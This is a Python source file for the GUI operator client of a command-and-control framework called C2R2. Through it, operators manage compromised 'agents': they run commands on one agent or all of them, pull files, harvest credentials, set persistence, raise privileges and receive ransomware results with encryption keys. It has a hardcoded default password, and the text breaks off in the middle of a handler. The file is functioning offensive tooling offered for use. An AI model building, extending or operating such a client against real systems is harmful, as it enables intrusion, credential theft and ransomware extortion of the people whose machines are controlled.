#!/usr/bin/env python3
"""
C2R2 Team Client - GUI Interface for C2R2 Server via HTTP/WebSocket API

This application provides a graphical interface for operators to connect
to a C2R2 server using the REST/WebSocket API.

Architecture similar to Havoc C2, Sliver, and other modern C2 frameworks:
- Server runs on red team infrastructure with a dedicated API port
- Operators connect via HTTP/WebSocket from their machines
- GUI displays connected agents, allows command execution, etc.
"""

import os
import sys
import json
import time
import queue
import threading
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any

# Tkinter imports (cross-platform GUI)
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog

# HTTP/WebSocket libraries
try:
    import requests
except ImportError:
    print("Error: requests is required. Install with: pip install requests")
    sys.exit(1)

try:
    import websocket
except ImportError:
    print("Error: websocket-client is required. Install with: pip install websocket-client")
    sys.exit(1)


class C2R2ApiClient:
    """HTTP/WebSocket client for communicating with C2R2 server API."""
    
    def __init__(self):
        self.base_url: Optional[str] = None
        self.ws_url: Optional[str] = None
        self.token: Optional[str] = None
        self.ws: Optional[websocket.WebSocketApp] = None
        self.connected = False
        self.on_event: Optional[callable] = None
        self._ws_thread: Optional[threading.Thread] = None
        self._running = False
    
    def connect(self, host: str, port: int, password: str, username: str = "operator") -> tuple[bool, str]:
        """
        Connect to the C2R2 server API.
        
        Args:
            host: Server hostname/IP
            port: API port (default 5555)
            password: API password
            username: Username for login
        
        Returns:
            Tuple of (success, message)
        """
        self.base_url = f"http://{host}:{port}"
        self.ws_url = f"ws://{host}:{port}/api/events"
        
        try:
            # Login and get token
            response = requests.post(
                f"{self.base_url}/api/auth/login",
                json={"username": username, "password": password},
                timeout=10
            )
            
            if response.status_code != 200:
                return False, f"Login failed: HTTP {response.status_code}"
            
            data = response.json()
            if not data.get("success"):
                return False, data.get("message", "Login failed")
            
            self.token = data.get("token")
            if not self.token:
                return False, "No token received"
            
            self.connected = True
            return True, f"Connected as {username}"
            
        except requests.exceptions.ConnectionError:
            return False, f"Connection failed: Cannot connect to {host}:{port}"
        except requests.exceptions.Timeout:
            return False, "Connection timeout"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def start_event_listener(self, on_event: callable):
        """Start WebSocket connection for real-time events."""
        if not self.token:
            return
        
        self.on_event = on_event
        self._running = True
        
        def on_message(ws, message):
            try:
                event = json.loads(message)
                if self.on_event:
                    self.on_event(event)
            except json.JSONDecodeError:
                pass
        
        def on_error(ws, error):
            if self._running:
                print(f"WebSocket error: {error}")
        
        def on_close(ws, close_status_code, close_msg):
            if self._running:
                print(f"WebSocket closed: {close_status_code} - {close_msg}")
        
        def on_open(ws):
            print("WebSocket connected")
        
        self.ws = websocket.WebSocketApp(
            self.ws_url,
            header={"Authorization": f"Bearer {self.token}"},
            on_message=on_message,
            on_error=on_error,
            on_close=on_close,
            on_open=on_open
        )
        
        self._ws_thread = threading.Thread(target=self.ws.run_forever, daemon=True)
        self._ws_thread.start()
    
    def stop_event_listener(self):
        """Stop WebSocket connection."""
        self._running = False
        if self.ws:
            self.ws.close()
    
    def _headers(self) -> Dict[str, str]:
        """Get headers with auth token."""
        return {"Authorization": f"Bearer {self.token}"}
    
    def get_agents(self) -> tuple[bool, Any]:
        """Get list of connected agents."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.get(
                f"{self.base_url}/api/agents",
                headers=self._headers(),
                timeout=10
            )
            
            if response.status_code == 401:
                return False, "Authentication failed"
            if response.status_code != 200:
                return False, f"HTTP {response.status_code}"
            
            data = response.json()
            return data.get("success", False), data.get("data", {})
            
        except Exception as e:
            return False, str(e)
    
    def get_agent(self, agent_id: int) -> tuple[bool, Any]:
        """Get specific agent info."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.get(
                f"{self.base_url}/api/agents/{agent_id}",
                headers=self._headers(),
                timeout=10
            )
            
            if response.status_code == 404:
                return False, "Agent not found"
            if response.status_code == 401:
                return False, "Authentication failed"
            if response.status_code != 200:
                return False, f"HTTP {response.status_code}"
            
            data = response.json()
            return data.get("success", False), data.get("data", {})
            
        except Exception as e:
            return False, str(e)
    
    def send_command(self, agent_id: int, command: str) -> tuple[bool, str]:
        """Send command to an agent."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/cmd",
                headers=self._headers(),
                json={"command": command},
                timeout=30
            )
            
            if response.status_code == 401:
                return False, "Authentication failed"
            if response.status_code == 404:
                return False, "Agent not found"
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def send_command_all(self, command: str) -> tuple[bool, Any]:
        """Send command to all agents."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/all/cmd",
                headers=self._headers(),
                json={"command": command},
                timeout=30
            )
            
            if response.status_code == 401:
                return False, "Authentication failed"
            
            data = response.json()
            return data.get("success", False), data.get("data", [])
            
        except Exception as e:
            return False, str(e)
    
    def download_file(self, agent_id: int, remote_path: str) -> tuple[bool, str]:
        """Request file download from agent."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/download",
                headers=self._headers(),
                json={"remote_path": remote_path},
                timeout=30
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def harvest_credentials(self, agent_id: int) -> tuple[bool, str]:
        """Trigger credential harvesting on agent."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/harvest",
                headers=self._headers(),
                timeout=30
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def set_persistence(self, agent_id: int, method: str) -> tuple[bool, str]:
        """Set persistence on agent."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/persist",
                headers=self._headers(),
                json={"method": method},
                timeout=30
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def configure_beacon(self, agent_id: int, interval: int, jitter: int) -> tuple[bool, str]:
        """Configure beacon timing."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/beacon",
                headers=self._headers(),
                json={"interval": interval, "jitter": jitter},
                timeout=30
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def elevate_agent(self, agent_id: int) -> tuple[bool, str]:
        """Elevate agent to admin."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/elevate",
                headers=self._headers(),
                timeout=30
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def get_server_status(self) -> tuple[bool, Any]:
        """Get server status."""
        if not self.base_url:
            return False, "Not connected"
        
        try:
            response = requests.get(
                f"{self.base_url}/api/status",
                timeout=10
            )
            
            if response.status_code != 200:
                return False, f"HTTP {response.status_code}"
            
            return True, response.json()
            
        except Exception as e:
            return False, str(e)
    
    def disconnect(self):
        """Disconnect from the server."""
        self.stop_event_listener()
        
        if self.connected and self.token:
            try:
                requests.post(
                    f"{self.base_url}/api/auth/logout",
                    headers=self._headers(),
                    timeout=5
                )
            except Exception:
                pass
        
        self.connected = False
        self.token = None
        self.base_url = None
        self.ws_url = None


class C2R2TeamClient:
    """Main GUI application for C2R2 Team Client."""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("C2R2 Team Client")
        self.root.geometry("1200x800")
        self.root.minsize(800, 600)
        
        # Set icon if available
        try:
            if sys.platform == 'win32':
                self.root.iconbitmap(default='')
        except Exception:
            pass
        
        # Dark theme colors
        self.colors = {
            'bg': '#1e1e1e',
            'fg': '#d4d4d4',
            'accent': '#007acc',
            'accent_hover': '#1c97ea',
            'panel_bg': '#252526',
            'input_bg': '#3c3c3c',
            'success': '#4ec9b0',
            'warning': '#dcdcaa',
            'error': '#f14c4c',
            'info': '#569cd6',
        }
        
        # Configure root
        self.root.configure(bg=self.colors['bg'])
        
        # Initialize API client
        self.api = C2R2ApiClient()
        self.event_queue = queue.Queue()
        self.running = True
        self.selected_client = None
        self.agents: Dict[int, dict] = {}  # Dictionary to store connected agents
        self._agent_tree_items: Dict[int, str] = {}  # Mapping of agent_id to tree item
        
        # Create UI
        self._setup_styles()
        self._create_menu()
        self._create_login_frame()
        self._create_main_frame()
        
        # Start with login frame visible
        self.main_frame.pack_forget()
        self.login_frame.pack(fill=tk.BOTH, expand=True)
        
        # Start event processor
        self.root.after(100, self._process_event_queue)
        
        # Handle window close
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
    
    def _setup_styles(self):
        """Configure ttk styles for dark theme."""
        style = ttk.Style()
        
        # Try to use a theme that works well with dark colors
        try:
            style.theme_use('clam')
        except Exception:
            pass
        
        # Configure styles
        style.configure('Dark.TFrame', background=self.colors['bg'])
        style.configure('Panel.TFrame', background=self.colors['panel_bg'])
        style.configure('Dark.TLabel', 
                       background=self.colors['bg'], 
                       foreground=self.colors['fg'])
        style.configure('Panel.TLabel',
                       background=self.colors['panel_bg'],
                       foreground=self.colors['fg'])
        style.configure('Header.TLabel',
                       background=self.colors['bg'],
                       foreground=self.colors['accent'],
                       font=('Consolas', 14, 'bold'))
        style.configure('Dark.TButton',
                       background=self.colors['accent'],
                       foreground='white')
        style.configure('Dark.TEntry',
                       fieldbackground=self.colors['input_bg'],
                       foreground=self.colors['fg'])
        
        # Treeview style
        style.configure('Dark.Treeview',
                       background=self.colors['panel_bg'],
                       foreground=self.colors['fg'],
                       fieldbackground=self.colors['panel_bg'],
                       rowheight=25)
        style.configure('Dark.Treeview.Heading',
                       background=self.colors['bg'],
                       foreground=self.colors['fg'],
                       font=('Consolas', 10, 'bold'))
        style.map('Dark.Treeview',
                 background=[('selected', self.colors['accent'])],
                 foreground=[('selected', 'white')])
    
    def _create_menu(self):
        """Create the menu bar."""
        menubar = tk.Menu(self.root, bg=self.colors['bg'], fg=self.colors['fg'])
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0, bg=self.colors['bg'], fg=self.colors['fg'])
        file_menu.add_command(label="Disconnect", command=self._disconnect)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self._on_close)
        menubar.add_cascade(label="File", menu=file_menu)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0, bg=self.colors['bg'], fg=self.colors['fg'])
        help_menu.add_command(label="About", command=self._show_about)
        help_menu.add_command(label="Commands Help", command=self._show_commands_help)
        menubar.add_cascade(label="Help", menu=help_menu)
        
        self.root.config(menu=menubar)
    
    def _create_login_frame(self):
        """Create the login/connection frame."""
        self.login_frame = ttk.Frame(self.root, style='Dark.TFrame')
        
        # Center container
        center_frame = ttk.Frame(self.login_frame, style='Dark.TFrame')
        center_frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)
        
        # Title
        title_label = ttk.Label(
            center_frame, 
            text="🔐 C2R2 Team Client", 
            style='Header.TLabel',
            font=('Consolas', 24, 'bold')
        )
        title_label.pack(pady=(0, 30))
        
        subtitle = ttk.Label(
            center_frame,
            text="Connect to C2R2 Server via API",
            style='Dark.TLabel',
            font=('Consolas', 12)
        )
        subtitle.pack(pady=(0, 20))
        
        # Connection form
        form_frame = ttk.Frame(center_frame, style='Panel.TFrame', padding=30)
        form_frame.pack(padx=20, pady=10)
        
        # Server Host
        row = 0
        ttk.Label(form_frame, text="Server Host:", style='Panel.TLabel').grid(
            row=row, column=0, sticky='e', padx=5, pady=8)
        self.host_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
        self.host_entry.grid(row=row, column=1, padx=5, pady=8)
        self.host_entry.insert(0, "localhost")
        
        # API Port
        row += 1
        ttk.Label(form_frame, text="API Port:", style='Panel.TLabel').grid(
            row=row, column=0, sticky='e', padx=5, pady=8)
        self.api_port_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
        self.api_port_entry.grid(row=row, column=1, padx=5, pady=8)
        self.api_port_entry.insert(0, "5555")
        
        # Username
        row += 1
        ttk.Label(form_frame, text="Username:", style='Panel.TLabel').grid(
            row=row, column=0, sticky='e', padx=5, pady=8)
        self.username_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
        self.username_entry.grid(row=row, column=1, padx=5, pady=8)
        self.username_entry.insert(0, "operator")
        
        # API Password
        row += 1
        ttk.Label(form_frame, text="API Password:", style='Panel.TLabel').grid(
            row=row, column=0, sticky='e', padx=5, pady=8)
        self.password_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry', show='*')
        self.password_entry.grid(row=row, column=1, padx=5, pady=8)
        self.password_entry.insert(0, "c2r2-secret")
        
        row += 1
        hint_label = ttk.Label(
            form_frame, 
            text="(Default password is 'c2r2-secret' - change with --api-password flag on server)",
            style='Panel.TLabel',
            font=('Consolas', 9)
        )
        hint_label.grid(row=row, column=1, sticky='w', padx=5)
        
        # Connect button
        row += 1
        self.connect_btn = tk.Button(
            form_frame,
            text="🔗 Connect",
            font=('Consolas', 12, 'bold'),
            bg=self.colors['accent'],
            fg='white',
            activebackground=self.colors['accent_hover'],
            activeforeground='white',
            cursor='hand2',
            relief=tk.FLAT,
            padx=30,
            pady=10,
            command=self._connect
        )
        self.connect_btn.grid(row=row, column=0, columnspan=2, pady=20)
        
        # Status label
        row += 1
        self.login_status = ttk.Label(form_frame, text="", style='Panel.TLabel')
        self.login_status.grid(row=row, column=0, columnspan=2)
    
    def _create_main_frame(self):
        """Create the main application frame (shown after connection)."""
        self.main_frame = ttk.Frame(self.root, style='Dark.TFrame')
        
        # Top bar with connection info
        top_bar = ttk.Frame(self.main_frame, style='Panel.TFrame')
        top_bar.pack(fill=tk.X, padx=5, pady=5)
        
        self.connection_label = ttk.Label(
            top_bar,
            text="🔐 Not Connected",
            style='Panel.TLabel',
            font=('Consolas', 10, 'bold')
        )
        self.connection_label.pack(side=tk.LEFT, padx=10)
        
        disconnect_btn = tk.Button(
            top_bar,
            text="Disconnect",
            bg=self.colors['error'],
            fg='white',
            relief=tk.FLAT,
            command=self._disconnect
        )
        disconnect_btn.pack(side=tk.RIGHT, padx=10)
        
        # Main paned window
        main_paned = ttk.PanedWindow(self.main_frame, orient=tk.HORIZONTAL)
        main_paned.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Left panel - Agents list
        left_panel = ttk.Frame(main_paned, style='Panel.TFrame')
        main_paned.add(left_panel, weight=1)
        
        # Agents header
        agents_header = ttk.Frame(left_panel, style='Panel.TFrame')
        agents_header.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(
            agents_header,
            text="🖥️ Connected Agents",
            style='Panel.TLabel',
            font=('Consolas', 12, 'bold')
        ).pack(side=tk.LEFT)
        
        refresh_btn = tk.Button(
            agents_header,
            text="🔄",
            bg=self.colors['info'],
            fg='white',
            relief=tk.FLAT,
            command=self._refresh_agents
        )
        refresh_btn.pack(side=tk.RIGHT)
        
        # Agents treeview
        tree_frame = ttk.Frame(left_panel, style='Panel.TFrame')
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        columns = ('ID', 'Host', 'User', 'OS', 'Privileges')
        self.agents_tree = ttk.Treeview(
            tree_frame,
            columns=columns,
            show='headings',
            style='Dark.Treeview'
        )
        
        for col in columns:
            self.agents_tree.heading(col, text=col)
            self.agents_tree.column(col, width=80)
        
        self.agents_tree.column('ID', width=40)
        self.agents_tree.column('Host', width=120)
        self.agents_tree.column('User', width=100)
        self.agents_tree.column('OS', width=150)
        self.agents_tree.column('Privileges', width=80)
        
        scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.agents_tree.yview)
        self.agents_tree.configure(yscrollcommand=scrollbar.set)
        
        self.agents_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.agents_tree.bind('<<TreeviewSelect>>', self._on_agent_select)
        self.agents_tree.bind('<Double-1>', self._on_agent_double_click)
        
        # Right panel - Console and commands
        right_panel = ttk.Frame(main_paned, style='Panel.TFrame')
        main_paned.add(right_panel, weight=3)
        
        # Console output
        console_frame = ttk.Frame(right_panel, style='Panel.TFrame')
        console_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        ttk.Label(
            console_frame,
            text="📝 Console Output",
            style='Panel.TLabel',
            font=('Consolas', 12, 'bold')
        ).pack(anchor=tk.W)
        
        self.console_output = scrolledtext.ScrolledText(
            console_frame,
            wrap=tk.WORD,
            bg=self.colors['bg'],
            fg=self.colors['fg'],
            font=('Consolas', 10),
            insertbackground=self.colors['fg']
        )
        self.console_output.pack(fill=tk.BOTH, expand=True, pady=5)
        self.console_output.config(state=tk.DISABLED)
        
        # Configure text tags for colors
        self.console_output.tag_config('info', foreground=self.colors['info'])
        self.console_output.tag_config('success', foreground=self.colors['success'])
        self.console_output.tag_config('warning', foreground=self.colors['warning'])
        self.console_output.tag_config('error', foreground=self.colors['error'])
        self.console_output.tag_config('prompt', foreground=self.colors['accent'])
        
        # Command input frame
        cmd_frame = ttk.Frame(right_panel, style='Panel.TFrame')
        cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.selected_label = ttk.Label(
            cmd_frame,
            text="C2R2>",
            style='Panel.TLabel',
            font=('Consolas', 11, 'bold')
        )
        self.selected_label.pack(side=tk.LEFT, padx=(0, 5))
        
        self.cmd_entry = tk.Entry(
            cmd_frame,
            bg=self.colors['input_bg'],
            fg=self.colors['fg'],
            insertbackground=self.colors['fg'],
            font=('Consolas', 11),
            relief=tk.FLAT
        )
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.cmd_entry.bind('<Return>', self._send_command)
        self.cmd_entry.bind('<Up>', self._history_up)
        self.cmd_entry.bind('<Down>', self._history_down)
        
        send_btn = tk.Button(
            cmd_frame,
            text="Send",
            bg=self.colors['accent'],
            fg='white',
            relief=tk.FLAT,
            command=lambda: self._send_command(None)
        )
        send_btn.pack(side=tk.RIGHT)
        
        # Command history
        self.cmd_history: List[str] = []
        self.history_index = -1
        
        # Quick actions frame
        actions_frame = ttk.Frame(right_panel, style='Panel.TFrame')
        actions_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(
            actions_frame,
            text="Quick Actions:",
            style='Panel.TLabel'
        ).pack(side=tk.LEFT, padx=(0, 10))
        
        quick_actions = [
            ("/list", "📋 List"),
            ("/help", "❓ Help"),
            ("/harvest", "🔑 Harvest"),
        ]
        
        for cmd, text in quick_actions:
            btn = tk.Button(
                actions_frame,
                text=text,
                bg=self.colors['panel_bg'],
                fg=self.colors['fg'],
                relief=tk.FLAT,
                command=lambda c=cmd: self._quick_command(c)
            )
            btn.pack(side=tk.LEFT, padx=2)
    
    def _connect(self):
        """Handle connection to API server."""
        host = self.host_entry.get().strip()
        port = self.api_port_entry.get().strip()
        username = self.username_entry.get().strip()
        password = self.password_entry.get()
        
        if not host:
            self.login_status.config(text="❌ Host is required", foreground=self.colors['error'])
            return
        
        if not password:
            self.login_status.config(text="❌ Password is required", foreground=self.colors['error'])
            return
        
        self.login_status.config(text="⏳ Connecting...", foreground=self.colors['warning'])
        self.connect_btn.config(state=tk.DISABLED)
        self.root.update()
        
        # Connect in a separate thread to avoid blocking UI
        def connect_thread():
            try:
                port_int = int(port)
            except ValueError:
                self.root.after(0, lambda: self._on_connect_fail("Invalid port number"))
                return
            
            success, message = self.api.connect(host, port_int, password, username)
            
            if success:
                # Start event listener
                self.api.start_event_listener(self._on_server_event)
                self.root.after(0, lambda: self._on_connect_success(host, port_int))
            else:
                self.root.after(0, lambda: self._on_connect_fail(message))
        
        thread = threading.Thread(target=connect_thread, daemon=True)
        thread.start()
    
    def _on_server_event(self, event: dict):
        """Handle events from the WebSocket."""
        self.event_queue.put(event)
    
    def _process_event_queue(self):
        """Process events from the queue (runs in main thread)."""
        try:
            while True:
                event = self.event_queue.get_nowait()
                self._handle_event(event)
        except queue.Empty:
            pass
        
        if self.running:
            self.root.after(100, self._process_event_queue)
    
    def _handle_event(self, event: dict):
        """Handle a server event."""
        event_type = event.get("type")
        data = event.get("data", {})
        
        if event_type == "AgentConnected":
            self._update_agent(data)
            self._log_console(f"✅ Agent {data.get('id')} connected from {data.get('addr')}\n", 'success')
        
        elif event_type == "AgentDisconnected":
            agent_id = data.get("id")
            self._remove_agent(agent_id)
            self._log_console(f"❌ Agent {agent_id} disconnected\n", 'error')
        
        elif event_type == "AgentUpdated":
            self._update_agent(data)
        
        elif event_type == "CommandOutput":
            agent_id = data.get("agent_id")
            output = data.get("output", "")
            is_error = data.get("is_error", False)
            tag = 'error' if is_error else None
            self._log_console(f"📨 [{agent_id}]: {output}\n", tag)
        
        elif event_type == "FileDownloaded":
            self._log_console(
                f"📥 File downloaded from agent {data.get('agent_id')}: "
                f"{data.get('filename')} ({data.get('size')} bytes) -> {data.get('save_path')}\n",
                'success'
            )
        
        elif event_type == "CredentialsHarvested":
            self._log_console(
                f"🔑 Credentials harvested from agent {data.get('agent_id')}: "
                f"{data.get('count')} entries -> {data.get('save_path')}\n",
                'success'
            )
        
        elif event_type == "RansomwareResult":
            self._log_console(
                f"🔐 Ransomware {data.get('operation')} on agent {data.get('agent_id')}: "
                f"{data.get('result')}\n",
                'warning'
            )
            if data.get("key"):
                self._log_console(f"   Key: {data.get('key')}\n", 'warning')
        
        elif event_type == "ServerMessage":
            level = data.get("level", "info")
            message = data.get("message", "")
            tag = {'info': 'info', 'warning': 'warning', 'error': 'error'}.get(level, None)
            self._log_console(f"ℹ️ Server: {message}\n", tag)
    
    def _on_connect_success(self, host: str, port: int):
        """Handle successful connection."""
        self.login_frame.pack_forget()
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        self.connection_label.config(
            text=f"🔐 Connected to {host}:{port}",
            foreground=self.colors['success']
        )
        
        # Log to console
        self._log_console(f"✅ Connected to C2R2 Server at {host}:{port}\n", 'success')
        self._log_console("Type /help for available commands\n", 'info')
        
        # Load initial agent list
        self._refresh_agents()
    
    def _on_connect_fail(self, message: str):
        """Handle connection failure."""
        self.login_status.config(text=f"❌ {message}", foreground=self.colors['error'])
        self.connect_btn.config(state=tk.NORMAL)
    
    def _disconnect(self):
        """Disconnect from the server."""
        self.api.disconnect()
        
        self.main_frame.pack_forget()
        self.login_frame.pack(fill=tk.BOTH, expand=True)
        self.login_status.config(text="")
        self.connect_btn.config(state=tk.NORMAL)
        
        # Clear agents list
        for item in self.agents_tree.get_children():
            self.agents_tree.delete(item)
        self.agents.clear()
        self._agent_tree_items.clear()
        self.selected_client = None
        self._update_prompt()
    
    def _refresh_agents(self):
        """Refresh the agents list from the server."""
        if not self.api.connected:
            return
        
        def refresh_thread():
            success, data = self.api.get_agents()
            if success:
                agents_list = data.get("agents", [])
                self.root.after(0, lambda: self._update_agents_list(agents_list))
            else:
                self.root.after(0, lambda: self._log_console(f"❌ Failed to refresh agents: {data}\n", 'error'))
        
        threading.Thread(target=refresh_thread, daemon=True).start()
    
    def _update_agents_list(self, agents_list: List[dict]):
        """Update the agents list from server response."""
        # Clear current list
        for item in self.agents_tree.get_children():
            self.agents_tree.delete(item)
        self.agents.clear()
        self._agent_tree_items.clear()
        
        # Add agents
        for agent in agents_list:
            self._update_agent(agent)
    
    def _update_agent(self, agent_info: dict):
        """Update or add an agent to the tree."""
        agent_id = agent_info.get('id')
        if agent_id is None:
            return
        
        # Check if agent already exists
        if agent_id in self._agent_tree_items:
            item = self._agent_tree_items[agent_id]
            if self.agents_tree.exists(item):
                self.agents_tree.item(item, values=(
                    agent_id,
                    agent_info.get('hostname') or agent_info.get('addr', '...'),
                    agent_info.get('username', '...'),
                    agent_info.get('os_version', '...'),
                    agent_info.get('privileges', '...')
                ))
                self.agents[agent_id] = agent_info
                return
        
        # Add new agent
        item = self.agents_tree.insert('', tk.END, values=(
            agent_id,
            agent_info.get('hostname') or agent_info.get('addr', '...'),
            agent_info.get('username', '...'),
            agent_info.get('os_version', '...'),
            agent_info.get('privileges', '...')
        ))
        self._agent_tree_items[agent_id] = item
        self.agents[agent_id] = agent_info
    
    def _remove_agent(self, agent_id: int):
        """Remove an agent from the tree."""
        if agent_id in self._agent_tree_items:
            item = self._agent_tree_items[agent_id]
            if self.agents_tree.exists(item):
                self.agents_tree.delete(item)
            del self._agent_tree_items[agent_id]
        
        if agent_id in self.agents:
            del self.agents[agent_id]
        
        if self.selected_client == agent_id:
            self.selected_client = None
            self._update_prompt()
    
    def _log_console(self, text: str, tag: Optional[str] = None):
        """Log text to the console output."""
        self.console_output.config(state=tk.NORMAL)
        if tag:
            self.console_output.insert(tk.END, text, tag)
        else:
            self.console_output.insert(tk.END, text)
        self.console_output.see(tk.END)
        self.console_output.config(state=tk.DISABLED)
    
    def _on_agent_select(self, event):
        """Handle agent selection in treeview."""
        selection = self.agents_tree.selection()
        if selection:
            item = selection[0]
            values = self.agents_tree.item(item)['values']
            agent_id = int(values[0])
            
            self.selected_client = agent_id
            self._update_prompt()
    
    def _on_agent_double_click(self, event):
        """Handle double-click on agent."""
        selection = self.agents_tree.selection()
        if selection:
            item = selection[0]
            values = self.agents_tree.item(item)['values']
            agent_id = int(values[0])
            
            # Show agent info
            agent_info = self.agents.get(agent_id, {})
            self._log_console(f"\n📋 Agent [{agent_id}] Info:\n", 'info')
            self._log_console(f"   Address: {agent_info.get('addr', 'N/A')}\n")
            self._log_console(f"   Hostname: {agent_info.get('hostname', 'N/A')}\n")
            self._log_console(f"   Username: {agent_info.get('username', 'N/A')}\n")
            self._log_console(f"   OS: {agent_info.get('os_version', 'N/A')}\n")
            self._log_console(f"   Privileges: {agent_info.get('privileges', 'N/A')}\n")
            self._log_console(f"   Connected: {agent_info.get('connected_at', 'N/A')}\n\n")
    
    def _update_prompt(self):
        """Update the command prompt."""
        if self.selected_client:
            self.selected_label.config(text=f"C2R2[{self.selected_client}]>")
        else:
            self.selected_label.config(text="C2R2>")
    
    def _send_command(self, event):
        """Send command from the entry field."""
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        
        # Add to history
        self.cmd_history.append(cmd)
        self.history_index = len(self.cmd_history)
        
        # Clear entry
        self.cmd_entry.delete(0, tk.END)
        
        # Log the command
        self._log_console(f">>> {cmd}\n", 'prompt')
        
        # Parse and execute command
        parts = cmd.split()
        if not parts:
            return
        
        command = parts[0].lower()
        
        # Handle local commands
        if command == '/list':
            self._refresh_agents()
        
        elif command == '/select' and len(parts) >= 2:
            try:
                agent_id = int(parts[1])
                if agent_id in self.agents:
                    self.selected_client = agent_id
                    self._update_prompt()
                    self._log_console(f"✅ Selected agent {agent_id}\n", 'success')
                else:
                    self._log_console(f"❌ Agent {agent_id} not found\n", 'error')
            except ValueError:
                self._log_console("❌ Invalid agent ID\n", 'error')
        
        elif command == '/deselect':
            self.selected_client = None
            self._update_prompt()
            self._log_console("✅ Deselected agent\n", 'success')
        
        elif command == '/help':
            self._show_commands_help()
        
        elif command == '/cmd' and len(parts) >= 2:
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                cmd_text = ' '.join(parts[1:])
                self._execute_command(self.selected_client, cmd_text)
        
        elif command == '/cmd_all' and len(parts) >= 2:
            cmd_text = ' '.join(parts[1:])
            self._execute_command_all(cmd_text)
        
        elif command == '/download' and len(parts) >= 2:
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                remote_path = ' '.join(parts[1:])
                self._download_file(self.selected_client, remote_path)
        
        elif command == '/harvest':
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                self._harvest_credentials(self.selected_client)
        
        elif command == '/persist' and len(parts) >= 2:
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                method = parts[1]
                self._set_persistence(self.selected_client, method)
        
        elif command == '/beacon' and len(parts) >= 2:
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                try:
                    config = parts[1].split(':')
                    interval = int(config[0])
                    jitter = int(config[1]) if len(config) > 1 else 0
                    self._configure_beacon(self.selected_client, interval, jitter)
                except (ValueError, IndexError):
                    self._log_console("❌ Invalid beacon config. Use /beacon <interval:jitter>\n", 'error')
        
        elif command == '/elevate':
            if self.selected_client is None:
                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
            else:
                self._elevate_agent(self.selected_client)
        
        else:
            self._log_console(f"❌ Unknown command: {command}. Use /help\n", 'error')
    
    def _execute_command(self, agent_id: int, command: str):
        """Execute a command on an agent."""
        def execute_thread():
            success, message = self.api.send_command(agent_id, command)
            tag = 'success' if success else 'error'
            self.root.after(0, lambda: self._log_console(f"📤 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=execute_thread, daemon=True).start()
    
    def _execute_command_all(self, command: str):
        """Execute a command on all agents."""
        def execute_thread():
            success, results = self.api.send_command_all(command)
            if success:
                for result in results:
                    tag = 'success' if result.get('success') else 'error'
                    self.root.after(0, lambda r=result, t=tag: self._log_console(
                        f"📤 [{r.get('agent_id')}]: {r.get('message')}\n", t
                    ))
            else:
                self.root.after(0, lambda: self._log_console(f"❌ Failed: {results}\n", 'error'))
        
        threading.Thread(target=execute_thread, daemon=True).start()
    
    def _download_file(self, agent_id: int, remote_path: str):
        """Request file download from agent."""
        def download_thread():
            success, message = self.api.download_file(agent_id, remote_path)
            tag = 'success' if success else 'error'
